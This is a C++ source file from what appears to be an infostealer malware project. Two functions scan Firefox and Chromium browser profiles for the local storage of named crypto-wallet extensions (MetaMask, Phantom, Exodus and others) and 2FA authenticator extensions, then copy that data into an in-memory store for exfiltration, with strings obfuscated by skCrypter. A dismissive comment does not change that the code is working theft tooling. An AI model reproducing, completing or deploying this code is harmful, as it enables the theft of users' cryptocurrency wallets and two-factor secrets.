#include <misc_stealing/extensions.hpp>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <unordered_map>
#include <browser_utils/get_browsers.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <json/json.hpp>

//dont really know the details of gecko / firefox extensions, but ittl do.

namespace fs = std::filesystem;

namespace misc_exfiltration {

//prefs.js line: user_pref("extensions.webextensions.uuids", "{\"id\":\"uuid\"}");
//unescape the inner json string and return id -> uuid map
static std::unordered_map<std::string, std::string> parse_ff_uuids(const fs::path& prefs_js) {
    std::unordered_map<std::string, std::string> m;
    std::ifstream f(prefs_js);
    std::string line;
    while (std::getline(f, line)) {
        if (line.find(skCrypt("extensions.webextensions.uuids")) == std::string::npos) continue;
        size_t p = line.find(skCrypt(", \""));
        if (p == std::string::npos) continue;
        p += 3;
        size_t end = line.rfind(skCrypt("\");"));
        if (end == std::string::npos || end <= p) continue;
        std::string raw = line.substr(p, end - p);
        std::string unesc;
        unesc.reserve(raw.size());
        for (size_t i = 0; i < raw.size(); i++) {
            if (raw[i] == '\\' && i + 1 < raw.size() && raw[i + 1] == '"') {
                unesc += '"'; i++;
            } else {
                unesc += raw[i];
            }
        }
        try {
            auto j = nlohmann::json::parse(unesc);
            for (auto& [id, uuid] : j.items())
                m[id] = uuid.get<std::string>();
        } catch (...) {}
        break;
    }
    return m;
}

//firefox stores extension data at storage/default/moz-extension+++<UUID>[^privateBrowsingAllowed]/
//UUID->extension-id mapping is in prefs.js extensions.webextensions.uuids
void steal_gecko_extensions() {
    static const std::vector<std::string> ff_ext_ids = {
        skCrypt("webextension@metamask.io"),                //MetaMask
        skCrypt("phantom@phantom.app"),                     //Phantom (added FF 2023)
        skCrypt("auth@booli.se"),                           //Authenticator 2FA
        skCrypt("{446900e4-71c2-419f-a6a7-df9c091e268b}"),  //Bitwarden
        //chatgpt placeholder, cba to get top extension lists rn.
    };

    for (const auto& browsers_dir : utils::get_gecko_browsers()) {
        try {
            for (const auto& pe : fs::directory_iterator(browsers_dir)) {
                if (!pe.is_directory()) continue;
                fs::path profile = pe.path();
                fs::path prefs_js = profile / skCrypt("prefs.js");
                if (!fs::exists(prefs_js)) continue;

                auto uuid_map = parse_ff_uuids(prefs_js);
                if (uuid_map.empty()) continue;

                fs::path storage = profile / skCrypt("storage") / skCrypt("default");
                if (!fs::exists(storage)) continue;

                std::string pname = profile.filename().string();

                for (const auto& ext_id : ff_ext_ids) {
                    auto it = uuid_map.find(ext_id);
                    if (it == uuid_map.end()) continue;
                    const std::string& uuid = it->second;

                    //some extensions request private browsing access and get a different dir suffix
                    for (const char* sfx : { (const char*)skCrypt(""), (const char*)skCrypt("^privateBrowsingAllowed") }) {
                        fs::path ext_dir = storage / (skCrypt("moz-extension+++") + uuid + sfx);
                        if (!fs::exists(ext_dir)) continue;
                        mem_store::import_tree(skCrypt("extensions/gecko/") + pname + "/" + ext_id, ext_dir);
                    }
                }
            }
        } catch (...) {}
    }
}

    //pasted the IDs for the most part. might have to update. cba to check every single one.
    // everybody who tries to use this in an actual campaign deserves to fail anyway.
    void steal_chromium_extensions() {
        static const std::vector<std::string> ext_ids = {
            //crypto wallets
            "nkbihfbeogaeaoehlefnkodbefgpgknn", //MetaMask
            "bfnaelmomeimhlpmgjnjophhpkkoljpa", //Phantom
            "hnfanknocfeofbddgcijnmhnfnkdnaad", //Coinbase Wallet
            "egjidjbpglichdcondbcbdnbeeppgdph", //Trust Wallet
            "fnjhmkhhmkbjkkabndcnnogagogbneec", //Ronin
            "ibnejdfjmmkpcnlpebklmnkoeoihofec", //TronLink
            "dmkamcknogkgcdfhhbddcghachkejeap", //Keplr
            "aholpfdialjgjfhomihkjbmgjidlcdno", //Exodus
            "ffnbelfdoeiohenkjibnmadjiehjhajb", //Yoroi
            "afbcbjpbpfadlkmhmclhkeeodmamcflc", //Math Wallet
            "bhhhlbepdkbapadjdnnojkbgioiodbic", //Solflare
            "mcohilncbfahbmgdjkbpemcciiolgcge", //OKX Wallet
            "acmacodkjbdgmoleebolmdjonilkdbch", //Rabby Wallet
            "mfgccjchihfkkindfppnaooecgfneiii", //TokenPocket
            "haiffjcadagjlijoggckpgfnoeiflnem", //Uniswap
            "aiifbnbfobpmeekipheeijimdpnlpgpp", //Station Wallet (Terra)
            "fhbohimaelbohpjbbldcngcnapndodjp", //BNB Chain Wallet
            "ppbibelpcjmhbdihakflkdcoccbgbkpo", //OneKey
            //2FA authenticators
            "bhghoamapcdpbohphigoooaddinpkbai", //Authenticator (2FA Client)
            "ilgcnkfdcnobepanfelbkddddgodpdbn", //GAuth Authenticator
            "gaedmjdfmmahhbjefcbgaolhhanlaolb", //Authy (legacy Chrome app)
            "oeljdldpnmdbchonielidgobddfffla",  //EOS Authenticator
            "dkdlkgdomkjlbnchoajpkglndlklmfhe", //Aegis (PWA)
        };

        auto browsers = utils::get_chromium_browsers();

        for (const auto& browser_path : browsers) {
            try {
                for (const auto& profile_entry : fs::directory_iterator(browser_path)) {
                    if (!profile_entry.is_directory()) continue;

                    fs::path ext_settings = profile_entry.path() / skCrypt("Local Extension Settings");
                    if (!fs::exists(ext_settings)) continue;

                    std::string profile_name = profile_entry.path().filename().string();

                    for (const auto& ext_id : ext_ids) {
                        fs::path ext_dir = ext_settings / ext_id;
                        if (!fs::exists(ext_dir)) continue;

                        std::string vprefix = skCrypt("extensions/") + profile_name + "/" + ext_id;
                        mem_store::import_tree(vprefix, ext_dir);
                    }
                }
            } catch (const std::exception&) {}
        }

    }
}
